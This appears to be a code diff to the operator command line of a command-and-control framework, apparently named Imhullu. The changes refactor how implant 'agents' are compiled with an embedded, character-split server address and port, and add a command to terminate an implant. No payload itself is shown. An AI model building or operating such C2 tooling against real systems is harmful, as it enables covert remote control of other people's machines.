@@ -87,14 +87,14 @@ class ImhulluCLI(cmd.Cmd):
         self._agent_uuid = agent_uuid
         self.prompt = f"{self._agent_uuid}\n{UNDERLINE}Imhullu>{RESET} ";
 
-    def _compile_agent(self, agent):
+    def _compile_agent(self, name, server, port):
         """modify agent server and port then compiler"""
         pi_server = ''
-        for char in agent.server:
+        for char in server:
             pi_server += "'" + char + "'" + ','
         pi_server += '0'  # null terminator
 
-        command = ["make", f'SERVER_M="SERVER=\\"{pi_server}\\""', f'PORT_M="PORT=\\"{agent.port}\\""']
+        command = ["make", f'SERVER_M="SERVER=\\"{pi_server}\\""', f'PORT_M="PORT=\\"{port}\\""']
         process = subprocess.Popen(command, cwd="../agent/", stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
 
         while True:
@@ -123,9 +123,7 @@ class ImhulluCLI(cmd.Cmd):
         server = args[1]
         port = args[2]
 
-        agent = Agent(name=name, server=server, port=port)
-
-        self._compile_agent(agent)
+        self._compile_agent(name, server, port)
 
         create_agent_payload = {
             "name": name
@@ -141,11 +139,15 @@ class ImhulluCLI(cmd.Cmd):
         task = {
             "task": "",
             "task_type": InputType.AgentShutdown.value,
-            "agent_uuid": self.uuid
+            "agent_uuid": uuid
         }
 
         print(self._create_task(task) + '\n')
 
+    @agent_uuid_required
+    def do_shutdown(self, args):
+        """terminate implant\n\tUsage: <command>\n"""
+        self._shutdown_agent(self._agent_uuid)
 
     def do_remove_agent(self, uuid):
         """remove agent (WIP and terminate implant)\n\tUsage: <command> <agent_uuid>\n"""
@@ -160,7 +162,6 @@ class ImhulluCLI(cmd.Cmd):
         endpoint = "/remove_agent/"
         remove_agent_payload_json = json.dumps(remove_agent_payload)
         print(self._api_post_req(endpoint, post_data=remove_agent_payload_json))
-        self._shutdown_agent(uuid)
         print("Agent terminated")
 
     def do_list_agents(self, args):
